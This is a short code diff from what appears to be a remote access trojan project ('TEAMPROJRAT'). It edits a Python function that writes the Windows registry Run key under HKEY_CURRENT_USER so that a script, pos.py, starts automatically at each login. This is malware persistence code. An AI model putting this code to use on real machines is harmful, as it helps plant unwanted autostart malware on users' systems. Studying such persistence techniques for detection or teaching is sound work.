@@ -16,8 +16,7 @@ def AddToRegistry():
     # name of the python file with extension 
     s_name="C:\\Users\\IEUser\\Desktop\\TEAMPROJRAT-master\\UDP_Connection\\pos.py"    
       
-    # joins the file name to end of path address 
-    address=os.path.join(s_name)  
+    # joins the file name to end of path address   
 
     # key we want to change is HKEY_CURRENT_USER  
     # key value is Software\Microsoft\Windows\CurrentVersion\Run 
@@ -28,7 +27,7 @@ def AddToRegistry():
     open = reg.OpenKey(key,key_value,0,reg.KEY_ALL_ACCESS) 
       
     # modifiy the opened key 
-    reg.SetValueEx(open,"client",0,reg.REG_SZ,address) 
+    reg.SetValueEx(open,"pos",0,reg.REG_SZ,s_name) 
       
     # now close the opened key 
     reg.CloseKey(open) 
